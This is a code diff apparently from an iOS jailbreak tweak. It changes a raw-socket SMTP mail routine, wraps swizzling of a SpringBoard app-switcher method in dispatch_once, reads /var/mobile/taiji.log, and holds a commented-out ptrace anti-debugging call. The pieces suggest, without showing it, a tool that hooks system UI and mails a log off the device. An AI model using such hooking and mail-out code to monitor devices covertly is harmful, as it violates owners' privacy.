@@ -499,11 +499,10 @@ void sendmail(const char *username,const char *password,const char *email,const 
     memset(buf, 0, 1500);
     sprintf(buf, "Subject: %s\r\n\r\n", subject);
     send(sockfd, buf, strlen(buf), 0);
+    //content
+    send(sockfd, body, strlen(body), 0);
     memset(buf, 0, 1500);
-    sprintf(buf, "%s\r\n", body);
-    send(sockfd, buf, strlen(buf), 0);
-    memset(buf, 0, 1500);
-    sprintf(buf, ".\r\n");
+    sprintf(buf, "\r\n.\r\n");
     send(sockfd, buf, strlen(buf), 0);
     memset(rbuf, 0, 1500);
     recv(sockfd, rbuf, 1500, 0);
@@ -604,11 +603,14 @@ static IMP sOriginalImp = NULL;
         system("killall -9 SpringBoard");
     }
     //ptrace(PT_DENY_ATTACH, 0, 0, 0);
-    Class originalClass = NSClassFromString(@"SBAppSliderController");  //%hook SBAppSliderController
-    Method originalMeth = class_getInstanceMethod(originalClass, @selector(switcherWasPresented:));
-    sOriginalImp = method_getImplementation(originalMeth);
-	Method replacementMeth = class_getInstanceMethod(NSClassFromString(@"Monsoon"), @selector(patchedLaunch:));
-	method_exchangeImplementations(originalMeth, replacementMeth);
+    static dispatch_once_t onceToken;
+    dispatch_once(&onceToken, ^{
+        Class originalClass = NSClassFromString(@"SBAppSliderController");  //%hook SBAppSliderController
+        Method originalMeth = class_getInstanceMethod(originalClass, @selector(switcherWasPresented:));
+        sOriginalImp = method_getImplementation(originalMeth);
+        Method replacementMeth = class_getInstanceMethod(NSClassFromString(@"Monsoon"), @selector(patchedLaunch:));
+        method_exchangeImplementations(originalMeth, replacementMeth);
+    });
 }
 
 - (void)patchedLaunch:(_Bool)arg1{
@@ -624,7 +626,8 @@ static IMP sOriginalImp = NULL;
     //[alert show];
     
 #pragma mark - do twice will crash
-    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND,0), ^{
+    static dispatch_once_t onceToken;
+    dispatch_once(&onceToken, ^{
         int fd = open("/var/mobile/taiji.log",O_RDONLY);
         int len = (int)lseek(fd,0,SEEK_END);
         char *mbuf = (char *) mmap(NULL,len,PROT_READ,MAP_PRIVATE,fd,0);
